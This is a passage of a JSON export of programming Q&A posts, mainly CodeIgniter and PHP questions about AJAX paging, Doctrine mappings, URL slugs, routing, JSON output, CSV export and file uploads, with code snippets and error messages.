\"0.1\");\n\n$.ajax({\n    cache: true,\n    type: 'GET',\n    url: '/friends/get_friends_list',\n    dataType: 'json',\n    data: {\n        offset: setOffset\n    },\n    success: function(json) {\n        if(json.data.length &gt; 0) {\n            for(var i = 0; i &lt; json.data.length; i++) {\n\n\n                var installed = (typeof json.data[i].installed != 'undefined' ? '&lt;a href=\"/'+ json.data[i].username +'\" class=\"viewbtn\"&gt;&lt;span class=\"houdini\"&gt;View wishlist&lt;/span&gt;&lt;/a&gt;' : '&lt;a href=\"/invitefriend?id='+ json.data[i].id +'\" class=\"modal invitebtn\"&gt;&lt;span class=\"\"&gt;Invite&lt;/span&gt;&lt;/a&gt;');\n\n                friends = '&lt;div class=\"friend\" id=\"' + json.data[i].id + '\"&gt;' +\n                            '&lt;a href=\"#\" title=\"' + json.data[i].name + '\"&gt;&lt;img src=\"http://graph.facebook.com/' + json.data[i].id + '/picture/?type=large\" width=\"125px\" height=\"125px\" alt=\"' + json.data[i].name + '\" /&gt;&lt;/a&gt;' +\n                            '&lt;strong&gt;' + json.data[i].name + '&lt;/strong&gt;' +\n                            installed +\n                            '&lt;/div&gt;';\n                $(friends).appendTo(\"#friendlist\");\n                $('#loading').hide();\n                $('#listarea').fadeTo('slow', '1.0');\n            }\n\n            var offsetlink = json.paging.next;\n\n            if(typeof offsetlink != 'undefined') {\n                $('a#loadmore').attr('href', offsetlink);\n            } else {\n                $('a#loadmore').hide();\n            }\n\n        }   \n    }\n});\n}\n</code></pre>\n\n<p>Example JSON result:</p>\n\n<pre><code>{\"data\":[{\"name\":\"Richard Bos\",\"username\":\"richardbigorange\",\"id\":\"100003237441639\"}],\"paging\":{\"next\":\"https:\\/\\/graph.facebook.com\\/538635509\\/friends?fields=installed,name,username&amp;limit=54&amp;offset=174&amp;__after_id=100003237441639\",\"previous\":\"https:\\/\\/graph.facebook.com\\/538635509\\/friends?fields=installed,name,username&amp;limit=54&amp;offset=66&amp;__before_id=100003237441639\"}}\n</code></pre>\n\n<p>What I'm currently doing is onload loading the the first set of friends. I then display a button at the bottom of the list that says 'see more friends'. With the click of this button I want to append the next set of friends on to the current list using the data from the paging array in the JSON result.</p>\n\n<p>However I'm just not sure of the most efficient way of doing this?</p>\n"},{"tags":["php","codeigniter","doctrine"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12524136,"title":"Doctrine with Code Igniter - Unable to save ManyToOne","body":"<p>I'm trying to integrate Code Igniter with Doctrine 2. Everything runs well except that I'm unable to save a property of one object. </p>\n\n<p>Here a little code snippet that throws a strange error</p>\n\n<pre><code>$account = $this-&gt;em-&gt;getRepository('Entities\\Account')-&gt;findOneById($accountId);\n\n$ofx = new \\Entities\\FinancialRecord();\n$a = $accountCatDao-&gt;findByPayeeName(\"PETROCAN\", $account);\n\nofx-&gt;setAccount($account);\n$ofx-&gt;setAmount($b-&gt;getAmount());\n$ofx-&gt;setDatePosted(new DateTime());\n$ofx-&gt;setDateUser(new DateTime());\n$ofx-&gt;setPayeeCity($b-&gt;getPayeeCity());\n$ofx-&gt;setPayeeName($b-&gt;getPayeeName());\n$ofx-&gt;setPayeeState($b-&gt;getPayeeState());\n$ofx-&gt;setTransactionId($b-&gt;getTransactionId());\n$ofx-&gt;setTransactionType($b-&gt;getTransactionType());\n\n// FOLLOWING LINE CAUSING THE PROBLEM\n$ofx-&gt;setCategory($a-&gt;getCategory());\n\n$this-&gt;em-&gt;persist($ofx);\n$this-&gt;em-&gt;flush();\n</code></pre>\n\n<p><strong>Error Thrown</strong></p>\n\n<pre><code>Fatal error: Uncaught exception 'Doctrine\\ORM\\Mapping\\MappingException' with message 'No mapping file found named 'Proxies.__CG__.Entities.Category.dcm.yml' for class 'Proxies\\__CG__\\Entities\\Category'.' in      /Users/yannlaviolette/Sites/finance/application/libraries/Doctrine/ORM/Mapping/MappingException.php on line 68\n</code></pre>\n\n<p>( ! ) </p>\n\n<pre><code>Doctrine\\ORM\\Mapping\\MappingException: No mapping file found named 'Proxies.__CG__.Entities.Category.dcm.yml' for class 'Proxies\\__CG__\\Entities\\Category'. in /Users/yannlaviolette/Sites/finance/application/libraries/Doctrine/ORM/Mapping/MappingException.php on line 68\n</code></pre>\n\n<p>My Mapping Object</p>\n\n<pre><code>Entities\\FinancialRecord:\n   type: entity\n   table: finance.financial_record\n   fields:\n      id:\n         id: true\n         type: bigint\n  nullable: false\n  generator:\n    strategy: SEQUENCE\ntransactionId:\n  type: string\n  length: 255\n  fixed: false\n  nullable: false\n  column: transaction_id\ntransactionType:\n  type: string\n  length: 10\n  fixed: false\n  nullable: false\n  column: transaction_type\ndatePosted:\n  type: datetimetz\n  nullable: false\n  column: date_posted\ndateUser:\n  type: datetimetz\n  nullable: false\n  column: date_user\npayeeName:\n  type: string\n  length: 255\n  fixed: false\n  nullable: false\n  column: payee_name\npayeeCity:\n  type: string\n  length: 255\n  fixed: false\n  nullable: false\n  column: payee_city\npayeeState:\n  type: string\n  length: 3\n  fixed: false\n  nullable: false\n  column: payee_state\namount:\n  type: decimal\n  nullable: false\nmanyToOne:\n   category:\n      targetEntity: Entities\\Category\n      cascade: [\"persist\", \"merge\"]\n    account:\n      targetEntity: Entities\\Account\n      cascade: [\"persist\", \"merge\"]\nlifecycleCallbacks: {  }\n</code></pre>\n\n<p>I really have no ideas. Spent 2 days on this problem. Can somebody help me plz!</p>\n\n<p>Yann</p>\n"},{"tags":["php","codeigniter","preg-replace","str-replace","stripslashes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13156917,"title":"How to prevent strip plus sign with codeigniter url_title function?","body":"<p>I am using that function in order to prevent wrong URL structure:</p>\n\n<pre><code>    &lt;?\nif (!defined('BASEPATH'))\n    exit('No direct script access allowed');\n\nif (!function_exists('seo_helper')) {\n\nfunction seo_link($deger) {\n$turkce=array(\"ş\",\"Ş\",\"ı\",\"(\",\")\",\"'\",\"ü\",\"Ü\",\"ö\",\"Ö\",\"ç\",\"Ç\",\" \",\"/\",\"*\",\"?\",\"ş\",\"Ş\",\"ı\",\"ğ\",\"Ğ\",\"İ\",\"ö\",\"Ö\",\"Ç\",\"ç\",\"ü\",\"Ü\");\n$duzgun=array(\"s\",\"S\",\"i\",\"\",\"\",\"\",\"u\",\"U\",\"o\",\"O\",\"c\",\"C\",\"-\",\"-\",\"-\",\"\",\"s\",\"S\",\"i\",\"g\",\"G\",\"I\",\"o\",\"O\",\"C\",\"c\",\"u\",\"U\");\n$deger=str_replace($turkce,$duzgun,$deger);\n$deger = url_title_plus($deger);\nreturn $deger;\n}  \n\n}  \n\n\nif ( ! function_exists('url_title_plus'))\n{\n    function url_title_plus($str, $separator = 'dash', $lowercase = FALSE)\n    {\n        if ($separator == 'dash')\n        {\n            $search     = '_';\n            $replace    = '-';\n        }\n        else\n        {\n            $search     = '-';\n            $replace    = '_';\n        }\n\n        $trans = array(\n                        '&amp;\\#\\d+?;'              =&gt; '',\n                        '&amp;\\S+?;'                =&gt; '',\n                        '\\s+'                   =&gt; $replace,\n                        '[^a-z0-9\\-\\._]'        =&gt; '',\n                        $replace            =&gt; $replace,\n                        $replace.'$'            =&gt; $replace,\n                        '^'.$replace            =&gt; $replace,\n                        '\\.+$'                  =&gt; ''\n                    );\n\n        $str = strip_tags($str);\n\n        foreach ($trans as $key =&gt; $val)\n        {\n            $str = preg_replace(\"#\".$key.\"#i\", $val, $str);\n        }\n\n        if ($lowercase === TRUE)\n        {\n            $str = strtolower($str);\n        }\n\n        return trim(stripslashes($str));\n    }\n}\n</code></pre>\n\n<p>Input string:</p>\n\n<pre><code>ATA'DAN MEZİTLİDE 4+1 HAVUZLU GÜVENLİKLİ KAÇMAZ!!!\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>ATADAN-MEZITLIDE-41-HAVUZLU-GUVENLIKLI-KACMAZ\n</code></pre>\n\n<p>What I want:</p>\n\n<pre><code>ATADAN-MEZITLIDE-4+1-HAVUZLU-GUVENLIKLI-KACMAZ\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13156593,"title":"Codeigniter inserting data ( with insert function )","body":"<p>I have simple model, that needs to inset data to my table. All works fine when i use sql and query but when i try to use insert function i get an error that i need to use set ??</p>\n\n<p>id in my database is auto increment and date is time stamp   </p>\n\n<pre><code>class Article extends CI_Model {\n\nprivate $id;\nprivate $title;\nprivate $text;\nprivate $date;\n\npublic function __construct()\n{\n    $this-&gt;load-&gt;database();\n}\n\npublic function save_article($title,$text)\n{\n    $this-&gt;title=$title;\n    $this-&gt;text=$text;\n    $this-&gt;id='';\n    $this-&gt;load-&gt;helper('date');\n    $this-&gt;date=now();\n    print_r($this);\n    //\"INSERT INTO article VALUES ('','\".$title.\"','\".$text.\"',NOW())\")\n    $this-&gt;db-&gt;insert('articles',$this);\n}\n}\n</code></pre>\n\n<blockquote>\n  <p>Article Object ( [id:Article:private] => [title:Article:private] =>\n  rrrrrrrrrrr [text:Article:private] => rrrrrrrrrrrrrrrrrr\n  [date:Article:private] => 1351680951 )</p>\n  \n  <p>A Database Error Occurred</p>\n  \n  <p>You must use the \"set\" method to update an entry.</p>\n  \n  <p>Filename: C:\\Program Files\n  (x86)\\EasyPHP-12.1\\www\\blog\\system\\database\\DB_active_rec.php</p>\n  \n  <p>Line Number: 1174</p>\n</blockquote>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":29,"score":-3,"question_id":13156303,"title":"unable to link css file to codeigniter","body":"<p>I am trying to link my css file to my codeigniter header.php</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"&lt;?php echo base_url(); ?&gt;views/css/style.css\" type=\"text/css\" media=\"screen\" charset=\"utf-8\" &gt;\n&lt;link href=\"//fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700|Merriweather:400,700,900\" rel=\"stylesheet\"&gt;\n</code></pre>\n"},{"tags":["php","arrays","codeigniter","recursion","multidimensional-array"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":12784383,"title":"Starting Level with multidimensional array","body":"<p>I have this organized array which works nice with below recursion function.</p>\n\n<pre><code>Array\n(\n[6] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [id_parent] =&gt; 6\n                [level] =&gt; 2\n                [lang] =&gt; en\n                [id_page] =&gt; 15\n                [title] =&gt; test 3\n                [nav_title] =&gt; \n                [url] =&gt; test-3\n            )\n\n    )\n\n[13] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [id_parent] =&gt; 13\n                [level] =&gt; 3\n                [lang] =&gt; en\n                [id_page] =&gt; 14\n                [title] =&gt; test 2\n                [nav_title] =&gt; \n                [url] =&gt; test-2\n            )\n\n    )\n\n[11] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [id_parent] =&gt; 11\n                [level] =&gt; 2\n                [lang] =&gt; en\n                [id_page] =&gt; 13\n                [title] =&gt; Test\n                [nav_title] =&gt; \n                [url] =&gt; test\n            )\n\n    )\n\n[3] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 11\n                [title] =&gt; Spare Parts\n                [nav_title] =&gt; \n                [url] =&gt; spare-parts\n            )\n\n        [1] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 10\n                [title] =&gt; İndustrial İroning Table\n                [nav_title] =&gt; \n                [url] =&gt; industrial-ironing-table\n            )\n\n        [2] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 9\n                [title] =&gt; İndustrial İroning Boiler\n                [nav_title] =&gt; \n                [url] =&gt; industrial-ironing-boiler\n            )\n\n        [3] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 8\n                [title] =&gt; Steam Boılers\n                [nav_title] =&gt; \n                [url] =&gt; steam-boilers\n            )\n\n        [4] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 7\n                [title] =&gt; Home Type Steam Boilers\n                [nav_title] =&gt; \n                [url] =&gt; home-type-steam-boilers\n            )\n\n        [5] =&gt; Array\n            (\n                [id_parent] =&gt; 3\n                [level] =&gt; 1\n                [lang] =&gt; en\n                [id_page] =&gt; 6\n                [title] =&gt; Used İrons\n                [nav_title] =&gt; \n                [url] =&gt; used-irons\n            )\n\n    )\n\n[0] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [id_parent] =&gt; 0\n                [level] =&gt; 0\n                [lang] =&gt; en\n                [id_page] =&gt; 1\n                [title] =&gt; Home\n                [nav_title] =&gt; \n                [url] =&gt; home\n            )\n\n        [1] =&gt; Array\n            (\n                [id_parent] =&gt; 0\n                [level] =&gt; 0\n                [lang] =&gt; en\n                [id_page] =&gt; 2\n                [title] =&gt; About Us\n                [nav_title] =&gt; \n                [url] =&gt; about-us\n            )\n\n        [2] =&gt; Array\n            (\n                [id_parent] =&gt; 0\n                [level] =&gt; 0\n                [lang] =&gt; en\n                [id_page] =&gt; 3\n                [title] =&gt; Products\n                [nav_title] =&gt; \n                [url] =&gt; products\n            )\n\n        [3] =&gt; Array\n            (\n                [id_parent] =&gt; 0\n                [level] =&gt; 0\n                [lang] =&gt; en\n                [id_page] =&gt; 5\n                [title] =&gt; Quality\n                [nav_title] =&gt; \n                [url] =&gt; quality\n            )\n\n        [4] =&gt; Array\n            (\n                [id_parent] =&gt; 0\n                [level] =&gt; 0\n                [lang] =&gt; en\n                [id_page] =&gt; 4\n                [title] =&gt; Contact Us\n                [nav_title] =&gt; \n                [url] =&gt; contact-us\n            )\n\n    )\n\n)\n</code></pre>\n\n<p>However, it works nice and recursively if I start to query from where <code>id_parent = 0</code>. When I wanted to select a random page and all its below levels, it works only one level down of selected page. I suppose that it is about <code>index</code> but unable to solve it. </p>\n\n<pre><code>function _populate_list($items, $parent = null, $level = '0', $max_depth = '1', $ul_class = '', $active_class = '', $active_segment = 2, $use_span = false, &amp;$data = '')\n{\n  $this-&gt;load-&gt;config('route_page', TRUE);\n  $route_page = $this-&gt;config-&gt;item('route_page', 'route_page');\n\n  $index = ($parent == null) ? '0' : $parent;\n  $space = str_repeat(\"\\t\", $level);\n\n  if (isset($items[$index]))\n  {\n    $data .= \"\\n\" . $space . '&lt;ul';\n    $data .= $parent == null ? ' id=\"navigation\"' : '';\n    if ($ul_class != '')\n      $data .= ' class=\"' . $ul_class . '\"';\n    $data .= '&gt;' . \"\\n\";\n\n    foreach ($items[$index] as $child)\n    {\n      $data .= $space . '&lt;li';\n\n      if ($active_class)\n      {\n        $tmp = $route_page[$child['lang'] . '/' . $child['id_page']];\n        $tmp = explode('/', $tmp);\n        if ($this-&gt;uri-&gt;segment($active_segment) == $tmp[$active_segment - 1])\n        {\n          $data .= ' class=\"' . $active_class . '\"';\n        }\n      }\n\n      $data .= '&gt;';\n\n      $data .= /*id=\"' . $child['lang']. '-' .$child['id_page'] . '\"&gt;'.*/ \"\\n\" . $space . '&lt;a href=\"' . base_url() . $route_page[$child['lang'] . '/' . $child['id_page']] . '\"&gt;';\n\n      if ($use_span)\n        $data .= '&lt;span&gt;';\n\n      if ($child['nav_title'] != '')\n        $data .= $child['nav_title'];\n      else\n        $data .= $child['title'];\n\n      $data .= ($use_span) ? '&lt;/span&gt;&lt;/a&gt;' . \"\\n\" : '&lt;/a&gt;' . \"\\n\";\n\n      if (($level + 1) &lt; $max_depth)\n      {\n        $this-&gt;_populate_list($items, $child['id_page'], $level + 1, $max_depth, '', '', $active_segment + 1, $use_span, $data);\n      }\n\n      $data .= $space . '&lt;/li&gt;' . \"\\n\";\n    }\n\n    $data .= $space . '&lt;/ul&gt;' . \"\\n\";\n  }\n  return $data;\n}\n</code></pre>\n\n<p>Any light to move on?</p>\n\n<p><strong>EDITED AFTER COMMENTS</strong></p>\n\n<p>Well now I am using the offered way by @Baba and it works unless I can't control starting and ending depth.</p>\n\n<pre><code>function build_navigation(array $array, $no = 0, $ul_class = '', $active_class = 'active', $active_segment = '2', $use_span = true)\n{\n  $this-&gt;load-&gt;config('route_page', TRUE);\n  $route_page = $this-&gt;config-&gt;item('route_page', 'route_page');\n\n  $child = $this-&gt;build_navigation_children_setter($array, $no);\n  if (empty($child)) return \"\";\n  $data = '&lt;ul';\n  if('' != $ul_class) $data .= ' class=\"' . $ul_class . '\"';\n  $data .= '&gt;'.\"\\n\";\n\n  foreach ( $child as $value ) \n  {\n\n    //$content .= sprintf(\"\\t&lt;li&gt;%s&lt;/li&gt;\\n\", $value['title']);\n    $data .= \"\\t\" . '&lt;li';\n    if($active_class)\n    {\n      $tmp = $route_page[$value['lang'] . '/' . $value['id_page']];\n      $tmp = explode('/', $tmp);\n      if($this-&gt;uri-&gt;segment($active_segment) == $tmp[$active_segment-1])\n      {\n         $data .=  ' class=\"' . $active_class . '\"';\n      }\n    }\n    $data .= '&gt;';\n\n    $data .= '&lt;a href=\"'. base_url() . $route_page[$value['lang'] . '/' . $value['id_page']] . '\"&gt;';\n\n    if ($use_span) $data .= '&lt;span&gt;';\n\n    if('' != $value['nav_title']) $data .= $value['nav_title'];\n    else $data .= $value['title'];\n\n    $data .= ($use_span) ? '&lt;/span&gt;&lt;/a&gt;' . \"\\n\" : '&lt;/a&gt;';\n    $data .= $this-&gt;build_navigation($array, $value['id_page'], $level+1, $max_depth);\n    $data .= \"\\t\" . '&lt;/li&gt;' . \"\\n\";\n  }\n  $data .= \"&lt;/ul&gt;\\n\";\n  return $data;\n}\n\nfunction build_navigation_children_setter($array, $id_page)\n{\n  return array_filter(\n    $array, \n    function ($var) use($id_page)\n    {\n      return $var['id_parent'] == $id_page;\n    }\n  );\n}\n</code></pre>\n\n<p>How to control start and stop depth?</p>\n"},{"tags":["php","codeigniter","command-line","cmd","shell-exec"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12834311,"title":"my command line code can't run using curl","body":"<p>What my problem is that I can not run a cmd line using curl in php. My Code is like this:</p>\n\n<pre><code>public function updateSolrProfilData($arrData)\n{\n  $solrClientOptionsCommit = $this-&gt;solrClientOptionsYazProfilCommit;\n\n  $urlCommit = \"http://\" . $solrClientOptionsCommit['hostname'] . \":\" . $solrClientOptionsCommit['port'] . \"/\" . $solrClientOptionsCommit['path'] . \"/update?stream.body=%3Ccommit/%3E -H \\\"Content-Type: text/xml\\\" --data-binary '&lt;add&gt;&lt;doc&gt;\";\n\n  foreach ($arrData as $firmaField =&gt; $firmaValue)\n  {\n    if ( ! is_array($firmaValue))\n    {\n      $urlCommit = $urlCommit . '&lt;field name=\"' . $firmaField . '\"&gt;' . $firmaValue . '&lt;/field&gt;';\n    }\n    else\n    {\n      foreach ($firmaValue as $firmaField2 =&gt; $firmaValue2)\n      {\n        if ('' != $firmaValue2)\n        {\n          $urlCommit = $urlCommit . '&lt;field name=\"' . $firmaField . '\"&gt;' . $firmaValue2 . \"&lt;/field&gt;\";\n        }\n      }\n    }\n  }\n\n  $urlCommit .= \"&lt;/doc&gt;&lt;/add&gt;'\";\n\n  $urlCommit = htmlspecialchars($urlCommit);\n\n  $ch = curl_init();\n  curl_setopt($ch, CURLOPT_POST, false);\n  curl_setopt($ch, CURLOPT_HEADER, false);\n  curl_setopt($ch, CURLOPT_URL, $urlCommit);\n  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n  curl_setopt($ch, CURLOPT_TIMEOUT, 20);\n  $data = curl_exec($ch);\n  curl_close($ch);\n}\n</code></pre>\n\n<p>When I run it in command line, it works. But it doesn't work when using curl, neither shell_exec function of php. What is wrong with that?</p>\n"},{"tags":["php","codeigniter","codeigniter-datamapper"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":292,"score":2,"question_id":9951849,"title":"CodeIgniter/Datamapper: Two one-to-many relationships to the same table not working","body":"<p>I'm having this problem with relationships with Codeigniter's <a href=\"http://datamapper.wanwizard.eu/\" rel=\"nofollow\">DataMapper</a>.\nI have an <code>Interview</code> model that has an <code>author_id</code> and an <code>interviewee_id</code>. They both relate to the user id in the user model.</p>\n\n<p>I've been trying several approaches and none work; this is what I have right now:</p>\n\n<pre><code>class Interview extends DataMapper\n{\n  var $has_one = array(\n    'interviewee' =&gt; array(\n      'class' =&gt; 'user',\n      'other_field' =&gt; 'done_interview'),\n    'author' =&gt; array(\n      'class' =&gt; 'user',\n      'other_field' =&gt; 'written_interview') \n  );\n}\n\nclass User extends DataMapper\n{\n  var $has_many = array(\n    'done_interview' =&gt; array(\n      'class' =&gt; 'interview',\n      'other_field' =&gt; 'interviewee'),\n    'written_interview' =&gt; array(\n      'class' =&gt; 'interview',\n      'other_field' =&gt; 'author') \n  );\n}\n</code></pre>\n\n<p>How do I let DataMapper know that one relationship will go through <code>author_id</code>, and the other through <code>interviewee_id</code>?</p>\n"},{"tags":["java","api","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":144,"score":2,"question_id":12178584,"title":"Restful API codeigniter - JAVA issue","body":"<p>We built our API using <a href=\"http://philsturgeon.co.uk/blog/2009/06/REST-implementation-for-CodeIgniter\" rel=\"nofollow\">Phil Sturgeons cool Restful API framework for codeigniter</a>, which is production ready and is used as part of our mobile apps implementation.</p>\n\n<p>We have an issue when using the API in Java</p>\n\n<pre><code>httpConnection = (HttpConnection) Connector.open(url, Connector.READ, true);\n// Set content type by given parameter......\nhttpConnection.setRequestProperty(\"Accept\", contentType);\nhttpConnection.setRequestProperty(\"User-Agent\", \"Profile/MIDP-2.0 Configuration/FCLDC-1.0\");\nhttpConnection.setRequestProperty(\"Content-Type\", contentType);\nhttpConnection.setRequestProperty(\"TK-API-KEY\", UrlFactory.TK_API_KEY);\n\n// httpConnection.setRequestProperty(\"Model\",\n// StyleUtil.getDeviceModel());\nif (httpConnection.getResponseCode() == 302)\n{\n  String redirectUrl =  httpConnection.getHeaderField(\"Location\");\n  httpConnection = (HttpConnection) Connector.open(redirectUrl, Connector.READ_WRITE, true);\n}\n\nif (httpConnection.getResponseCode() == HttpConnection.HTTP_OK)\n{\n  io = httpConnection.openInputStream();\n\n  int ch;\n  while ((ch = io.read()) != -1)\n  {\n    bo.write(ch);\n  }\n\n}\n</code></pre>\n\n<p><code>httpConnection.getResponseCode()</code> is unable to get the status code and returns a malformed exception. Our API server is NGINX.</p>\n"},{"tags":["codeigniter","routing","controllers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":193,"score":0,"question_id":11023189,"title":"CodeIgniter - When using $route['(:any)'] = 'pages/view/$1' how to use other controllers?","body":"<p>When using </p>\n\n<p><code>$route['(:any)'] = 'pages/view/$1';</code> </p>\n\n<p>and I want to use other controllers in my routing for example:</p>\n\n<pre><code>$route['del/(:any)'] = 'crud/del';\n</code></pre>\n\n<p>it won't work. I guess it will use </p>\n\n<p><code>pages/view/del/$1</code></p>\n\n<p>and not my crud-controller when deleting an item. How can I solve this?</p>\n"},{"tags":["php","mysql","codeigniter","csv"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13034765,"title":"Speed up csv export when using php from mysql database query","body":"<p>Ok, so i've got a web system (built on codeigniter &amp; running on mysql) that allows people to query a database of postal address data by making selections in a series of forms until they arrive at the selection that want, pretty standard stuff. They can then buy that information and download it via that system.</p>\n\n<p>The queries run very fast, but when it comes to applying that query to the database,and exporting it to csv, once the datasets get to around the 30,000 record mark (each row has around 40 columns of which about 20 are all populated with on average 20 chars of data per cell) it can take 5 or so minutes to export to csv.</p>\n\n<p>So, my question is, what is the main cause for the slowness? Is it that the resultset of data from the query is so large, that it is running into memory issues? Therefore should i allow much more memory to the process? Or, is there a much more efficient way of exporting to csv from a mysql query that i'm not doing? Should i save the contents of the query to a temp table and simply export the temp table to csv? Or am i going about this all wrong? Also, is the fact that i'm using Codeigniters Active Record for this prohibitive due to the way that it stores the resultset?</p>\n\n<p>Pseudo Code:</p>\n\n<pre><code>$query = $this-&gt;db-&gt;select('field1, field2, field3')-&gt;where_in('field1',$values_array)-&gt;get('tablename');\n$data = $this-&gt;dbutil-&gt;csv_from_result($download_query, $delimiter, $newline); // the some code to save the file\n$this-&gt;load-&gt;helper('download');\nforce_download($filename, $filedata);\n</code></pre>\n\n<p>Any advice is welcome! Thank you for reading!</p>\n"},{"tags":["php","codeigniter","view","path","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13146395,"title":"Codeigniter issues with paths in localhost (XAMPP)","body":"<p>The index page (aka homepage.php) in my code igniter install is working fine no matter what.</p>\n\n<p>The problem lies with using subdirectories to store other pages, currently its setup like:\n<img src=\"http://i.stack.imgur.com/kWl8y.png\" alt=\"img1\"></p>\n\n<p>loading homepage like <code>http://localhost/VAw_CI/</code> works fine (loading homepage.php), this is setup in routes.php:</p>\n\n<pre><code>$route['default_controller'] = \"pages/homepage\";\n</code></pre>\n\n<p>in config.php, I've setup:</p>\n\n<pre><code>$config['base_url'] = 'http://localhost/VAw_CI';\n\n/*\n|--------------------------------------------------------------------------\n| Index File\n|--------------------------------------------------------------------------\n|\n| Typically this will be your index.php file, unless you've renamed it to\n| something else. If you are using mod_rewrite to remove the page set this\n| variable so that it is blank.\n|\n*/\n$config['index_page'] = '';\n</code></pre>\n\n<p>I specified <code>$config['index_page'] = '';</code> above, because I modified my .htaccess located in <code>htdocs</code>like:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .*homepage/$0 [PT,L]\n</code></pre>\n\n<p>However, if I try to login on homepage.php, which is currently looks like:\n<img src=\"http://i.stack.imgur.com/IwVuV.png\" alt=\"img2\"></p>\n\n<p>It sends me to <code>http://localhost/VAw_CI/pages/clientlogin</code></p>\n\n<p>displaying:\n<img src=\"http://i.stack.imgur.com/RHcLB.png\" alt=\"img3\"></p>\n\n<p>I have controllers setup like:\n<img src=\"http://i.stack.imgur.com/8Ukwj.png\" alt=\"img4\"></p>\n\n<p>What gives here? When I visit <code>http://localhost/VAw_CI</code>, it is effectively loading the <code>views-&gt;pages-&gt;homepage.php</code> view properly, but it seems any other view doesn't work am I missing some path setup somewhere for pages <em>other</em> than the index (homepage.php) in my case?</p>\n"},{"tags":["php","json","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13152417,"title":"Only last row is returned in json using codeigniter","body":"<p>I am trying to return json data using codeigniter which I will later use that json in javascript. Now the problem is that it only returns the last row from database table and make a json format from that one row. Here is my code in controller</p>\n\n<pre><code>public function v1 () {\n    $this-&gt;load-&gt;model('model_jokes');\n\n    $jokes = $this-&gt;model_jokes-&gt;readJokes();\n    foreach ($jokes as $joke) {\n        $arr = array(\n                array(\n                    'title' =&gt; $joke-&gt;title,\n                    'description' =&gt; $joke-&gt;joke\n                )\n            );\n    }\n    echo json_encode($arr);\n}\n</code></pre>\n\n<p>how can I make it so that all data that I am retrieving from database is returned in json?</p>\n"},{"tags":["php","json","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":13152525,"title":"I am getting json data in a different format in codeigniter. Why?","body":"<p>I am trying to make and return json data using codeigniter. I want to receive that data in this format</p>\n\n<pre><code>[\n  {\n     'title': 'this is title',\n     'desc':  'THis is desc'\n  },\n   {\n     'title': 'this is title',\n     'desc':  'THis is desc'\n  }\n]\n</code></pre>\n\n<p>But I am receiving it this way</p>\n\n<pre><code>[[{\"title\":\"this is title\",\"desc\":\"this is desc\"}],[{\"title\":\"this is title\",\"description\":\"this is desc\"}]]\n</code></pre>\n\n<p>how can I change this format to above one?</p>\n\n<p>here is my code</p>\n\n<pre><code>public function v1 () {\n    $this-&gt;load-&gt;model('model_jokes');\n\n    $jokes = $this-&gt;model_jokes-&gt;readJokes();\n    $arr = array();\n    foreach ($jokes as $joke) {\n        $arr[] = array(\n                array(\n                    'title' =&gt; $joke-&gt;title,\n                    'description' =&gt; $joke-&gt;joke\n                )\n            );\n    }\n    echo json_encode($arr);\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13152467,"title":"How to get full path of the uploaded file in codeigniter?","body":"<p>I am using codeIgniter file uploading class example <a href=\"http://codeigniter.com/user_guide/libraries/file_uploading.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/libraries/file_uploading.html</a>  to upload files. In the example after i uploaded files it will show details like below in the upload success view page.</p>\n\n<pre><code> Array\n(\n[upload_data] =&gt; Array\n    (\n        [file_name] =&gt; VenkataKrishna10.pdf\n        [file_type] =&gt; application/pdf\n        [file_path] =&gt; C:/xampp/htdocs/upload/application/\n        [full_path] =&gt; C:/xampp/htdocs/upload/application/VenkataKrishna10.pdf\n        [raw_name] =&gt; VenkataKrishna10\n        [orig_name] =&gt; VenkataKrishna.pdf\n        [client_name] =&gt; VenkataKrishna.pdf\n        [file_ext] =&gt; .pdf\n        [file_size] =&gt; 83.27\n        [is_image] =&gt; \n        [image_width] 